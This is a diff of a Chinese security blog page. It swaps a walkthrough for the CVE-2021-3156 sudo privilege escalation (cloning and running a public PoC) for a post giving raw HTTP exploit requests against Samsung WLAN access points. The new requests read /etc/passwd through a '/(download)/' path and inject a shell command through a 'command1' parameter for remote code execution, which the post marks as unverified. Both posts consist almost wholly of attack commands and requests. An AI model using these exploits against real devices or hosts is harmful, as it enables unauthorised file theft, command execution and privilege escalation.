@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
     <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    <title>CVE-2021-3156 sudo权限提升漏洞 | GMF信息小站</title>
+    <title>Samsung WLAN AP 任意文件读取&amp;RCE | GMF信息小站</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
     <meta name="keywords" content="givemefivw, POC&EXP, Web安全, 渗透测试, 编程语言" >
     <meta name="description" content="信息安全小站" >
@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1613517811275.css">
+<link rel="stylesheet" href="/css/style.css?v=1613517811263.css">
 
     <!--[if lt IE 9]>
     
@@ -50,11 +50,11 @@
         <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
         <ul class="menu hidden" id="JELON__menu">
             
-            <li rel="/2021/02/01/CVE-2021-3156-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/index.html" class="item ">
+            <li rel="/2021/02/17/Samsung-WLAN-AP-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-RCE/index.html" class="item ">
                 <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
             </li>
             
-            <li rel="/2021/02/01/CVE-2021-3156-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/index.html" class="item ">
+            <li rel="/2021/02/17/Samsung-WLAN-AP-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-RCE/index.html" class="item ">
                 <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
             </li>
             
@@ -105,37 +105,28 @@
 <!-- 文章 -->
 <article class="post article">
     <header class="text-center">
-        <h3 class="post-title"><span>CVE-2021-3156 sudo权限提升漏洞</span></h3>
+        <h3 class="post-title"><span>Samsung WLAN AP 任意文件读取&amp;RCE</span></h3>
     </header>
     <p class="post-meta text-center">
         givemefivw 发表于
-        <time datetime="2021-02-01T02:31:26.000Z">2021-02-01</time>
+        <time datetime="2021-02-16T23:19:57.000Z">2021-02-17</time>
     </p>
     <div id="JELON__articlePostContent" class="post-content">
-        <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
-<li>1.8.2 - 1.8.31p2</li>
-<li>1.9.0 - 1.9.5p1<h2 id="查看sudo版本"><a href="#查看sudo版本" class="headerlink" title="查看sudo版本"></a>查看sudo版本</h2><img src="/2021/02/01/CVE-2021-3156-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png"></li>
-</ul>
-<p>1.8.27<br>存在此漏洞</p>
-<h2 id="下载PoC"><a href="#下载PoC" class="headerlink" title="下载PoC"></a>下载PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156.git</span><br><span class="line"></span><br><span class="line">cd </span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/02/01/CVE-2021-3156-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png"></p>
-<h2 id="新建测试用户"><a href="#新建测试用户" class="headerlink" title="新建测试用户"></a>新建测试用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">useradd -m test</span><br><span class="line"></span><br><span class="line">passwd test</span><br><span class="line"></span><br><span class="line">新的 密码：</span><br><span class="line">重新输入新的 密码：</span><br><span class="line">passwd：已成功更新密码</span><br></pre></td></tr></table></figure>
-<h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/02/01/CVE-2021-3156-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/3.png"></p>
-<h2 id="执行PoC"><a href="#执行PoC" class="headerlink" title="执行PoC"></a>执行PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sudo-hax-me-a-sandwich</span><br><span class="line"></span><br><span class="line">.&#x2F;sudo-hax-me-a-sandwich 2</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/02/01/CVE-2021-3156-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/4.png"></p>
-<h2 id="删除测试账户"><a href="#删除测试账户" class="headerlink" title="删除测试账户"></a>删除测试账户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">userdel test</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;先重启再删除，否则会提示</span><br><span class="line"></span><br><span class="line">user test is currently used by process </span><br></pre></td></tr></table></figure>
+        <h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;(download)&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p><img src="/2021/02/17/Samsung-WLAN-AP-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-RCE/1.png"></p>
+<h2 id="RCE-未验证"><a href="#RCE-未验证" class="headerlink" title="RCE(未验证)"></a>RCE(未验证)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;(download)&#x2F;tmp&#x2F;poc.txt HTTP&#x2F;1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 55</span><br><span class="line"></span><br><span class="line">command1&#x3D;shell%3Acat &#x2F;etc&#x2F;passwd|dd of&#x3D;&#x2F;tmp&#x2F;poc.txt</span><br></pre></td></tr></table></figure>
+
     </div>
     <p class="eof">-- EOF --</p>
     <p class="post-meta">
         <span class="post-cat">分类：
-            <a class="cat-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+            <a class="cat-link" href="/categories/POC-EXP/">POC&EXP</a>
         </span>
         <span class="post-tags">
             标签：
             
     
-        <a href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现</a>
+        <a href="/tags/PoC/" title="PoC">PoC</a>
     
 
         </span>
@@ -161,20 +152,16 @@
     
     <span class="prev fl">
         上一篇<br >
-        <a href="/2021/02/03/CVE-2020-14882-Weblogic-Console%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EPoC/">
-            
-                CVE-2020-14882 Weblogic Console远程代码执行漏洞PoC
-            
-        </a>
+        <a href="javascript: void(0);">没有上一篇了</a>
     </span>
     
 
     
     <span class="next fr">
         下一篇<br >
-        <a href="/2021/01/22/Xray-bat%E5%B0%8F%E8%84%9A%E6%9C%AC/">
+        <a href="/2021/02/04/CVE-2021-25646-Apache-Druid-RCE/">
             
-                Xray bat小脚本
+                CVE-2021-25646 Apache Druid RCE
             
         </a>
     </span>
@@ -293,7 +280,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1613517811276.js"></script>
+<script src="/js/main.js?v=1613517811268.js"></script>
 
 
 </body>
